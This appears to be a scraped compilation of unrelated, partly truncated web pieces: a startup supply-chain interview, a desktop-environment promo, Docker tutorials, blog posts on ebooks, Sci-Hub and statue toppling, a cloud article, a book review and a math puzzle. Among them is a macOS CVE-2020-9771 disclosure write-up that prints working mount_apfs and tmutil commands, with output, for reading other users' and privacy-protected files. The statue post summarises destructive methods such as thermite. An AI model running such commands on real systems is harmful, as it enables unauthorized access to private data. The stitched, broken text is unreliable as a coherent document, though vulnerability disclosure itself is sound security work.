had to re-do our entire supply chain. So that was definitely a challenge we were not anticipating. It’s ended up okay. The new manufacturer is a lot bigger and we can scale a lot more quickly. A big challenge that we had was that we manufactured in India. We manufactured in a Fairtrade facility. They had great communication, were very helpful, could do really small minimums, but we realised pretty earlier that we would not be able to source the type of fabric that we wanted from India. We could get really good cotton, but you couldn’t find polyester or nylon or anything that we would want. We had to import from Taiwan to India and that took a really, really long time. The fabric got stuck in customs, and we had to spend a lot more than anticipated on getting the fabric to the factory.&nbsp;</p><p>We had a lot of trouble sourcing our zippers, partly because YKK does not have the best customer service when you’re small. They expect you to be ordering hundreds of thousands of zippers, and we weren’t ordering that many. So we kept getting passed around between different customer service representatives and we ended up getting zippers from a YKK storage facility. They ended up working fine, but it took two months longer than …</p></div></div>

<h3 id="bkmrk-introduction">Introduction</h3>
<p id="bkmrk-the-maxx-interactive">The MaXX Interactive Desktop a.k.a.&nbsp; MaXX Desktop or MID is the continuation of the 5dwm.org project released many years back. &nbsp; By the way, the 5dwm.org website is not associated with us anymore and we do not endorse its content, although it's ours and was miss-appropriated from us a few years ago.&nbsp; Back to our regular program :)&nbsp; So don't be mistaken, there is only one other real implementation of the IRIX Interactive Desktop(IID) and&nbsp; it's MaXX Desktop!</p>
<p id="bkmrk-more-info-on-the-ori"><a title="Not just a theme..." href="https://maxxinteractive.com/books/misc/page/not-just-a-theme"><strong>&gt;&gt; More details on what MaXX Desktop is made of</strong></a></p>
<h3 id="bkmrk-our-mission"><br>Our Mission</h3>
<p id="bkmrk-our-goal-is-to-bring">Our mission is to bring back this great user experience which focused on performance, stability and productivity while sporting a smooth-clean-minimalism look and feel&nbsp; with low-resources consumption. A smart desktop that puts the user's application in the forefront.&nbsp; <em><strong>More for your creativity.</strong></em></p>
<p id="bkmrk-so-there-is-no-surpr">So there is no surprises here, MaXX Desktop is a highly tuned Workstation Environment which can leverage&nbsp; multi-core&nbsp; workload processing, robust asynchronous multi-threaded POSIX Messaging, hardware acceleration and GPU specific optimizations that&nbsp; makes the MaXX Desktop so fast, light-weight and dependable. Enough geekin' out for now, although, we are and proud to be.</p>
<p id="bkmrk-maxx-desktop-is-a-tr">MaXX Desktop is a true re-implementation of the SGI Desktop while respecting the classic/retro SGI look and feel (which is very important for us to get it right), but also to expand and build on top of those solid foundations with a more modern-current user experience.&nbsp; See it as the <em>classic</em> or<em>original&nbsp;</em> look and feel of the desktop and a new <em>modern</em> take.&nbsp; We want the modern look to be/feel like a natural evolution of the classic SGI look, as if SGI did it themselves throughout several years perfecting an already pretty awesome recipe. &nbsp; The modern look still supports SGI Color Schemes and introduce UTF-8 support, anti-aliased font rendering, more hardware acceleration and a new virtual-desktop manager.</p>
<p id="bkmrk-we-believe-in-a-high">We believe in a High Performance Desktop Environment that provides the right set of tools to maximize creativity and productivity without sacrificing&nbsp; your system resources to some eye candy non-sense.&nbsp;<em> <strong>Again, less is more... And it keeps you focused.<br></strong></em></p>
<h3 id="bkmrk-from-the-ground-up">From the Ground Up</h3>
<p id="bkmrk-maxx-desktop-is-desi">The MaXX&nbsp; Desktop is designed from the ground up for speed,&nbsp; fast/responsive, lightweight/simplicity over eye-candidness, but more importantly, to get the heck out of your way... The name <em>MaXX Interactive</em> doesn't mean maximum visual interaction, which are distractions or so what we call, UI noises. It's means maximum creativity with interactive assistance from the Desktop. In may ways, it's made for you and your brain so that it can relax, focus on let the creative juice flowing with far fever distractions. We see desktop notifications in a very different way, but this is for another discussion. In short, the MaXX Desktop let you focus on the creative&nbsp; tasks ahead without interference or visual distractions.<em><strong>&nbsp; Our design philosophy is simple, do more with less...</strong></em></p>
<h3 id="bkmrk-experience-matter">Experience Matters</h3>
<p id="bkmrk-finally%2C-our-team-me">Our team is sharing the same vision of making use of the right set of technologies, using industry proven best practices and guide lines to build the right software, the right way.&nbsp; We aim at providing a consistent and pleasant user experience built on top of modern and stable foundations but yet flexible.&nbsp; Every good and useful piece of tech deserves to be future-proof...&nbsp; This is where&nbsp; several decades of experience in building battle-proven mission critical systems and high performance Enterprise class applications comes in.&nbsp; If it's architect-ed properly,&nbsp; it can evolve without breaking apart!</p>
<h3 id="bkmrk-is-maxx-desktop-for-">Is MaXX Desktop for you?</h3>
<p id="bkmrk-maxx-desktop%27s-typic">MaXX Desktop's typical users are: 2D/3D Computer Graphics Artists, Motion Pictures and Special Effects Studios, Software/Game Developers, Visualization/Simulation, Virtual Reality power-users or Oil and Gas research to name a few.&nbsp; MaXX Desktop is also for anyone who wants get a break from all the surrounding noises and to create stuff while sporting a very unique/cool daily driver!&nbsp; <em><strong>Then, MaXX&nbsp; is for you too!&nbsp;</strong></em></p>

  <p>Docker allows us to stream logs to different places with plugins called logging drivers.</p>
<p>How to change logging driver? What’s the most popular ones?</p>

<p>Docker has got two types of logging drivers:</p>
<ul>
<li>built-in like:
<ul>
<li><code>awslogs</code></li>
<li><code>fluentd</code></li>
<li><code>gcplogs</code></li>
<li><code>gelf</code></li>
<li><code>journald</code></li>
<li><code>json-file</code></li>
<li><code>local</code></li>
<li><code>logentries</code></li>
<li><code>splunk</code></li>
<li><code>syslog</code></li>
</ul>
</li>
<li>external drivers that we can install with <code>docker plugin install</code></li>
</ul>
<p>Logging driver is used to forward logs from containers to specific log aggregators, widely known rsyslog or fluentd for example.</p>
<p>Default logging driver after installation is <code>json-file</code>.</p>
<p>It is important to test non default logging drivers before using on production - problems with logging can cause crash/hang or startup problems with containers.</p>
<h2 id="check-default-logging-driver">Check default logging driver</h2>
<p>This is driver that docker daemon will use for itself and containers that won’t have set explicit another driver at start</p>

<p>On Jul 21, I'm giving a free live talk with Q&amp;A; for LogicLounge, an 32nd CAV 2020 event sponsored by the Vienna Center for Logic and Algorithms.</p>
<p>It's called "Working as Intended: Surveillance Capitalism is not a Rogue Capitalism," which is (not coincidentally) the title of a forthcoming pamphlet I've written on the role that monopoly plays in our toxic and conspiratorial discourse.</p>
<p><a href="https://stanford.zoom.us/webinar/register/WN_9AwAiQSmTj2ZjaIsIoTr5A">https://stanford.zoom.us/webinar/register/WN_9AwAiQSmTj2ZjaIsIoTr5A</a></p>
<p>The "surveillance capitalism" thesis holds that companies spy because data lets them conduct devastatingly effective influence operations while racing past regulators who might otherwise rein in their operations.</p>
<p>I believe this gives undue credence to Big Tech's sales literature — the source of the claims about the power of behavioral advertising to influence behavior. Worse, it underplays the role that monopoly and state surveillance play in both the decay of public discourse and governmental complacency when it comes to corporate surveillance.</p>
<p>What if Big Tech's ability to command billions for ads have more to do with cornering markets and eking out marginal gains through targeting, with stale data being largely useless for commercial purposes — but still full of kompromat for greedy state surveillance agencies?</p>

<p>Many people have written lately asking for the best way to get electronic editions of my books and audiobooks, so now's a good time to remind you that I run my own ebook store, where I sell my publishers' electronic editions of my books:</p>
<p><a href="https://craphound.com/shop/">https://craphound.com/shop/</a></p>
<p>So I'm getting the 30% that Amazon would take if you bought the books from them, then I send the 70% to my publishers, and then <em>they</em> send me 25% of that back as my royalty – basically doubling my income.</p>
<p>But it's also a better deal for you: while all my books, in all bookstores, are sold without DRM (including these ones), these ebooks are also sold with <em>no terms and conditions</em>. Kindle books require that you "agree" to a sprawling garbage novella of impenetrable legalese.</p>
<p>Clicking "Buy" is also clicking "Agree" and what you agree to is a near-total waiver of your privacy and consumer rights. Amazon even reserves the right to reach into your device and delete your books if they change their minds about selling them to you.</p>
<p>They've done that before…with George Orwell's Nineteen Eighty-Four. No, I'm not making that up.</p>
<p><a href="https://www.nytimes.com/2009/07/18/technology/companies/18amazon.html">https://www.nytimes.com/2009/07/18/technology/companies/18amazon.html</a></p>
<p>I have asked dozens of Amazon press spokespeople whether they would do this again, and…crickets.</p>
<p>I once got invited to give a paid speech at Amazon and I said, "Sure, I'll even waive my fee. Just answer my questions about whether you will delete the Kindle books people buy in the future." I never got an answer, and I never gave the speech.</p>
<p>My store's also got my audiobooks. You can't even buy those on Amazon, or its audiobook monopolist Audible – that's because Audible refuses to carry my audiobooks because they're DRM-free.</p>
<p>Every book on Audible has DRM that locks it forever – even after the copyright has expired – to Amazon's platform. They and they alone can decide which devices can play those books.</p>
<p>This is the company that one day decided (for example) that it wouldn't stream its video to rivals' TV dongles, like Google's Chromecast. They changed their mind…eventually. Do you think it's the last time they'll change it?</p>
<p>Audible controls 90%+ of the audiobook market, and audiobooks presently account for about the same number of sales as hardcovers. That's an entire universe of literature that is under total control of a monopolist.</p>
<p>There are rivals to Audible that have virtually identical inventories and exactly the same prices: libro.fm, downpour.com, and – for my audiobooks, at least – craphound.com/shop.</p>
<p>My audiobooks – like my ebooks – come with no terms and conditions. The deal you make with me is the same deal you make with bookstores when you buy physical books: "Every right Congress ever gave you is intact. Don't violate copyright. We're cool. Thank you and come again."</p>
<p>As far as I know, this is the <em>only</em> way to buy ebooks published by commercial publishers without signing away your rights. It's not a "license," it's a sale. You bought it, you own it. It's a book. Books are older than copyright, than publishing, than paper, than commerce.</p>
<p>I totally reject the idea that the ancient compacts that bind us when we trade in literature can be unilaterally rewritten by a monopolist simply by making you click "I agree."</p>

<img src="https://i2.wp.com/craphound.com/images/scihubcites.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/scihubcites.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Alchemy looks a lot like science: an alchemist observes a phenomenon, hypothesises a causal relationship, and designs and performs an experiment to test the hypothesis.</p>
<p>The difference is in what happens next.</p>
<p>The scientist publishes their findings so that others can critique it. The alchemist does not. Scientists aren't smarter than alchemists, so scientists are every bit as capable of making themselves believe that drinking mercury is good for their health.</p>
<p>But scientists have to expose their work to peer-review, which means that their self-deception can be exposed and corrected. Alchemists just die of mercury poisoning.</p>
<p>Today, most peer-review happens through publication by a handful of giant, monopolistic journal publishers.</p>
<p>Scholarly and scientific research, most of it publicly funded, is given for free to these multibillion-dollar empires, who then charge the institutions where the authors work millions to access the journals in which that work appears.</p>
<p>The editorial boards and reviewers of these journals are volunteer positions, filled by scholars from those same institutions that pay millions to access the journals they're producing.</p>
<p>The journals themselves are pure rentiers, useless intermediaries that barely even edit the papers they publish:</p>
<p><a href="https://arxiv.org/pdf/1604.05363.pdf">https://arxiv.org/pdf/1604.05363.pdf</a></p>
<p>And yet, scholars send them work, because their career advancement depends on publication, preferably in widely cited journals.</p>
<p>For more than a decade, scholars have been fighting back, switching to "open access" journals that fund their (minimal) costs by charging to submit a paper for review and then publish for free. Major science funders now demand that grantees promise open access publication.</p>
<p>But the paywalled journals are still hanging in there. They have huge warchests of money looted from universities, and they have massive, locked up back-catalogs of scholarly work whose copyright they extorted from uncompensated researchers.</p>
<p>Enter Scihub, an unauthorized repository of millions of scientific and scholarly papers liberated from paywalls and made available for free to all comers.</p>
<p>The scholarly publishing industry hates Scihub so much that they've actually gone to courts around the world to demand that Scihub and its mirrors be blocked by national firewalls, censoring science in a bid to restore the mercury-swilling days of alchemy.</p>
<p>But what about the scholars – the actual researchers whose uncompensated words publishers sue to suppress when they go after Scihub?</p>
<p>For them, Scihub is a godsend.</p>
<p>Not only does Scihub make it possible for scholars to see all the literature they need to review to continue their work, irrespective of institutional affiliation (this is especially important in the Global South, where many universities can't afford subscriptions).</p>
<p>But – as a quartet of scholars from Brazil, Colombia, Czech, and Australia show in a new paper…well, the title says it all, really: "THE SCI-HUB EFFECT: SCI-HUB DOWNLOADS LEAD TO  MORE ARTICLE CITATIONS."</p>
<p><a href="https://arxiv.org/pdf/2006.14979.pdf">https://arxiv.org/pdf/2006.14979.pdf</a></p>
<p>That is, when your work is freely available, more people read it and cite it. And for scholars, more citations means more career opportunities: jobs, grants, conference invites…Everything that matters to the progress of scholarship.</p>
<p>I mean, yes, it's obvious, but it has some pretty fascinating implications – like, "If you're a scientist who wants to progress, you should let Nature publish your work and get the prestige, then defeat Nature's paywall so that Scihub can distribute it and get the impact."</p>

<p>With monument-toppling season upon us, it's time for the popular scientific and engineering press to dust off their beloved "What's the scientifically best way to tear down a statue" pieces and republish them for our quick reference.</p>
<p>"How to Topple a Statue Using Science," by James Stout for Popular Mechanics covers all the classics:</p>
<p><a href="https://www.popularmechanics.com/science/a32870657/remove-statue-science/">https://www.popularmechanics.com/science/a32870657/remove-statue-science/</a></p>
<p>Leverage: Get 70 buddies (for a notional 7000lb horse statue), 4×4 recovery straps (tied for leverage, look for heads, etc), split in two teams and rock back and forth.</p>
<p>Heat: You can reduce the team-sizes by weakening the materials – 40mins with a butane torch or 15-20 with propane torch.</p>
<p>Chem heat: Thermite around the ankles is more efficient than torches but is potentially harder to source</p>
<p>"Editor's Note: As national and worldwide attention to the removal of statues has grown, we have continued our reporting on the related science and safety issues, and have amended this article to reflect our findings."</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Dockerizing an application is simple, effective, but optimizing the size of Docker Image is the tricky part. Docker is easy to use but once the application starts scaling, the image size inflates exponentially. In general, the node docker image size of the applications is over 1 GB most of the time.</p>
<h3>Why the Size matters</h3>
<ol>
<li>Large docker image sizes - Bigger image size requires more space means increased expense.</li>
<li>Long build durations - It takes a longer time to push the images over the network and results in CI Pipeline delays.</li>
</ol>
<h3>Let’s Start The Optimization</h3>
<p>Here is our <a href="https://github.com/championshuttler/fluentbit-dashboard">demo application</a> built using the VueJS Application. </p>
<p>Here is the initial Dockerfile.</p>
<div data-language="bash"><pre><code>FROM node:10

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> http-server -g

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build

    </span></p>
<p>It is 1.34GB! Whoops!</p>
<p>Let’s start optimizing step by step</p>
<ol>
<li>Use <strong>Multi-Stage</strong> Docker Builds</li>
</ol>
<p>Multi-stage builds make it easy to optimize Docker images by using multiple <strong>intermediate</strong> images in a single Dockerfile. Read more about it <a href="https://docs.docker.com/develop/develop-images/multistage-build/">here</a>. By using multi-stage builds, we can install all dependencies in the build image and copy them to the leaner runtime image.</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build

FROM node:10

WORKDIR /app


COPY --from<span>=</span>BUILD_IMAGE /app/dist ./dist
COPY --from<span>=</span>BUILD_IMAGE /app/node_modules ./node_modules

RUN <span>npm</span> i -g http-server

<li>Remove Development Dependencies and use <strong>Node Prune</strong> Tool</li>
</ol>
<p>node-prune is an open-source tool for removing unnecessary files from the node_modules folder. Test files, markdown files, typing files and *.map files in Npm packages are not required at all in the production environment generally, most of the developers do not remove them from the production package. By using node-prune it can safely be removed.</p>
<p>We can use this to remove Development Dependencies:</p>

<p>After making these changes <code>Dockerfile</code> will look like:</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

July 4, 2020 | https://theevilbit.github.io/posts/cve_2020_9771/ | <a href="https://web.archive.org/web/*/https://theevilbit.github.io/posts/cve_2020_9771/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224
drwx———@ 12 csaby  staff      384 Nov  6 13:56 Archive

-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>

effect. But even if Amazon dominates the market, companies are using more than one cloud provider for their needs.</p><a name="cloud"></a><h3>What's the cloud anyways?</h3><p>To understand what the cloud is. We need to see what cloud computing is.
Later, we'll define the different functionalities we need in order to have a minimum viable cloud.</p><p><strong>Cloud Definition.</strong> From Wikipedia we have:</p><blockquote><p>Cloud computing is the on-demand availability of computer system resources,
especially data storage and computing power, without direct active management by the user. </p></blockquote><p><strong><em>Service Models</em></strong>. Our definition is broad, therefore we have multiple service models to enumerate:</p><ul><li><strong><em>Infrastructure as A Service:</em></strong> We don't have control over the underlying
cloud infrastructure but has control over the operating system, storage and applications. Popularized by AWS, Azure and GCP.</li><li><strong><em>Platform as a Service:</em></strong> With this service model we have control only over the deployed application. Examples are Google App Engine and
Amazon Fargate.</li><li><strong><em>Software as a Service:</em></strong> We have the capability of using an application through diverse clients. The greatest example is Salesforce. </li><li><strong><em>Backend as a Service:</em></strong> Web app and mobile app developers are provided with a way to link their applications to cloud storage and cloud computing services with application programming interfaces (APIs) exposed to their applications and custom software development kits (SDKs). Firebase is a good example
of backend as a service for mobile applications.</li><li><strong><em>Serverless Computing:</em></strong> Fully managed code by the cloud provider. Popularized by AWS Lambda.</li></ul><p>From <a href="https://www.fugue.co/blog/2014-08-11-minimum_viable_cloud.html">Josh Stella's Minimum Viable Cloud article</a> there are
other characteristics that are important for a <strong><em>Minimum Viable Cloud</em></strong>: </p><ul><li><strong><em>Elasticity:</em></strong> A cloud should be able to serve quickly its customers demands.</li><li><strong><em>Fault Tolerance:</em></strong> Or having resources in multiple geographical locations so even if a catastrophe happens
applications would run.</li><li><strong><em>Operational Expenditure instead of Capital Expenditure:</em></strong> Pay as you go approach and not in advance.</li></ul><p>As of now it seems that only the companies that we've seen before are the ones who satisfy all the marks.</p><p><strong><em>The fundamental characteristics of the cloud model</em></strong> are:</p><ul><li>An API for requesting computing and data resources.</li><li>Lack of active user management.</li></ul><p>That's why there are so many service models for cloud computing. But we want to build a Cloud.
There are other conditions we need to follow:</p><ul><li>Elasticity.</li><li>Fault Tolerance.</li><li>OpEx instead of CapEx.</li></ul><a name="why-not"></a><h3>Why don't we build a Cloud?</h3><p>Finally, we're ready to answer the question <em>can we even build our own cloud?</em>.</p><p>Perhaps, there's a path we can follow in order to build our own Cloud.
I'll write about OpenStack, a popular Cloud operating system.
Next, I'll list companies that are doing their own cloud.</p><p><strong>Existing solutions.</strong> <a href="https://www.openstack.org/">OpenStack</a> is the most popular solution for the creation of public
and private cloud providers. Why don't we have public clouds everywhere? There are many <a href="https://www.openstack.org/foundation/companies/">companies</a>
using OpenStack but most of it <a href="https://www.openstack.org/analytics">usage</a> comes from Private Clouds.</p><p><span>
      <span></span>
  <img alt="alt text" title="OpenStack" src="https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/766a7/openstack.png" srcset="https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/5243c/openstack.png 240w,https://serradas.org/static/1f2bffc2a5fef7d5961e4d38785c7498/766a7/openstack.png 401w" sizes="(max-width: 401px) 100vw, 401px" loading="lazy">
    </span></p><p>Even if we were to use OpenStack we would need to have Fault Tolerance for our use case, which is something hard to satisfy
without having multiple data centers in different geographical regions.</p><p><strong>There are companies trying to make a cloud by themselves or which have done it in the past</strong>:</p><ul><li><a href="https://www.digitalocean.com/">DigitalOcean</a>: From the founders of a managed hosting business, ServerStack. DigitalOcean
targets developers and startups instead of enterprise clients. They raised a Seed Funding of US$3.2 million. </li><li><a href="https://render.com/">Render</a>: "The Easiest Cloud for all your Apps and Websites" from their website. They take advantage
of Kubernetes plus AWS in order to provide a platform for applications.</li></ul><p>It introduces 2 different paths. Either getting a lot of funding at the beginning
or using a public cloud to bootstrap your business. Reinventing the wheel tempt can tempt us.
But there is a lack of innovation and a clear business case for innovating in the cloud.</p><p>Building a public cloud is not an easy feat. There are many aspects that we need to accomplish in order to make the customer
happy. Nevertheless, there are companies who've already done it from scratch. For this we have 2 paths:</p><ul><li>Funding</li><li>Bootstrap it using another public cloud.</li></ul><p>Innovation will be one of the most important things in this area.</p><h3>Conclusion</h3><p>So there you go! The answer of this question is...</p><blockquote><p>perhaps</p></blockquote><p>There are many trends in the cloud market at this moment. Companies have a hybrid infrastructure, one
that depends on multiple clouds providers.</p><p>We've understood that apart from an API and lack of active user management from resources we also need
to have elasticity, fault tolerance, and OpEx instead of CapEx in order to have a Minimum Viable Cloud.</p><p>Finally, we were able to check the different paths we could to take in order to make a cloud.</p><p>Follow me on <a href="https://twitter.com/RubenSerradas/">Twitter</a> if you liked this article.</p><p>If you want to keep in touch, join my <a href="https://tinyletter.com/rubenserradas">newsletter</a>.</p></section></div>]]>

Each essay is extremely focussed on a specific them. Most of them talk about concrete scenarios and how to deal with them. They are also independent and can be read one-by-one - there is no progression from one essay to the next.</p><p id="viewer-32bi0">As someone who has been this role for some time now, it really resonated with me that a lot of the advice is not technical but rather focussed around team work and enablement. These are the parts that are most difficult to internalize for architects because we are trained to think like developers and measure ourselves in terms of "code shipped". The role of an architect is more than, as the many voices on this book repeatedly tell us.</p><p id="viewer-271u8">The moment I started reading "97 things every software architect should know", I realized that a lot of highlighting was going to happen :). I have included here what I feel are the highlights from the book and cover most of the messages conveyed in it.

<h3 id="circle-time">Circle Time</h3>

<p>Every month, Jane Street Capital post a puzzle on their website.  This was the puzzle for <a href="https://www.janestreet.com/puzzles/circle-time/">June 2020</a>.</p>

<blockquote>
  <p>Call a “ring” of circles a collection of six circles of equal radius, say r, whose centers lie on the six vertices of a regular hexagon with side length 2r. This makes each circle tangent to its two neighbors, and we can call the center of the regular hexagon the “center” of the ring of circles. If we are given a circle C, what is the maximum proportion of the area of that circle we can cover with rings of circles entirely contained within C that all are mutually disjoint and share the same center?</p>
</blockquote>

